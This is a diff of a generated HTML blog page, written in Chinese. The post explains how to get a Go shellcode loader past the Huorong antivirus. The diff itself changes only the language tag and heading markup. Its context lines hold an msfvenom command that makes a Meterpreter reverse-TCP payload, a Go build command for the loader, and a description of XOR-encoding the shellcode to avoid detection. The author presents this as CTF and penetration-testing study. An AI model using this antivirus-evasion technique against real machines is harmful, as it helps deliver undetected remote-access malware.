@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en-us">
+<html lang="zh-CN">
     <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Go语言ShellCode免杀火绒'><title>Go语言ShellCode免杀火绒</title>
 
@@ -319,8 +319,8 @@
     <section class="article-content">
     
     
-    <h1 id="1--shellcode-加载器go">1.  Shellcode 加载器（go）</h1>
-<p>我们先看最后的免杀代码</p>
+    <h1 id="1--shellcode-加载器go">1.  Shellcode 加载器（go）
+</h1><p>我们先看最后的免杀代码</p>
 <pre><code class="language-go">package main
 
 import (
@@ -389,8 +389,8 @@ func xorEncrypt(buf []byte, value int) []byte {
 // go build -ldflags=&quot;-H windowsgui -w -s&quot; shellcodeLoader.go
 
 </code></pre>
-<h1 id="2-shellcode-生成">2. shellcode 生成</h1>
-<p>对于shellcode的生成我们采用msf进行生成：</p>
+<h1 id="2-shellcode-生成">2. shellcode 生成
+</h1><p>对于shellcode的生成我们采用msf进行生成：</p>
 <pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xxxx LPORT=xxxx -f c
 </code></pre>
 <p>对于生成的shellcode，我们如果不进行处理，对于火绒这类的杀毒软件来说，做简单的静态分析，如果坚持到0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50···这些关键字节，肯定会报毒：Backdoor/W64.Meterpreter.f</p>
@@ -411,8 +411,8 @@ func xorEncrypt(buf []byte, value int) []byte {
 	</a>
 	
 </figure></p>
-<h1 id="3可能的绕过方式">3.可能的绕过方式</h1>
-<p>一般来说，为了防止shellcode被检测到，我们通过对shellcode进行处理，如base64加密，亦或等等操作，也可以考虑github的sgn工具。</p>
+<h1 id="3可能的绕过方式">3.可能的绕过方式
+</h1><p>一般来说，为了防止shellcode被检测到，我们通过对shellcode进行处理，如base64加密，亦或等等操作，也可以考虑github的sgn工具。</p>
 <p>本文我们主要采用亦或操作（xor）</p>
 <p>我们先将msf生成的shellcode进行亦或操作：</p>
 <pre><code class="language-python"># xor.py 
@@ -535,8 +535,8 @@ func xorEncrypt(buf []byte, value int) []byte {
 	
 </figure></p>
 <p>我们将内存权限设置为MEM_COMMIT就可以了。</p>
-<h1 id="4-免杀效果">4. 免杀效果</h1>
-<p><figure 
+<h1 id="4-免杀效果">4. 免杀效果
+</h1><p><figure 
 	
 		class="gallery-image" 
 		style="
@@ -571,8 +571,8 @@ func xorEncrypt(buf []byte, value int) []byte {
 	</a>
 	
 </figure></p>
-<h1 id="5-总结">5. 总结</h1>
-<p>这是第一次尝试免杀，之前一直在学习pwn和web安全，但是在前段时间的上海市大学生磐石行动的比赛中，发现内网中存在杀毒软件，且无法及时绕过，虽然通过文件包含读取到了flag，但是却阻止了我们进一步的渗透利用，最后也只获得了第十一名，与决赛遗憾错过。</p>
+<h1 id="5-总结">5. 总结
+</h1><p>这是第一次尝试免杀，之前一直在学习pwn和web安全，但是在前段时间的上海市大学生磐石行动的比赛中，发现内网中存在杀毒软件，且无法及时绕过，虽然通过文件包含读取到了flag，但是却阻止了我们进一步的渗透利用，最后也只获得了第十一名，与决赛遗憾错过。</p>
 <p>回来之后，反思了很多，觉得还是要对免杀进行一部分的学习，go语言的shellcode免杀通过微信推文看到的，决定挺有意思的，便在之后的学习中进行尝试，没想到就成功绕过了火绒（其他杀毒软件还没有尝试过），但是这也激起了我学习的热情。</p>
 <p>此外，最近也收到了实验室导师的任务，给本科生同学们准备渗透测试（CTF）的课程，也觉得免杀蛮重要的，顺便也一起给讲了。</p>
 <p><strong>学无止境，脚踏实地。</strong></p>
@@ -614,7 +614,7 @@ func xorEncrypt(buf []byte, value int) []byte {
     <aside class="related-contents--wrapper">
     
     
-        <h2 class="section-title">Related contents</h2>
+        <h2 class="section-title"></h2>
         <div class="related-contents">
             <div class="flex article-list--tile">
                 
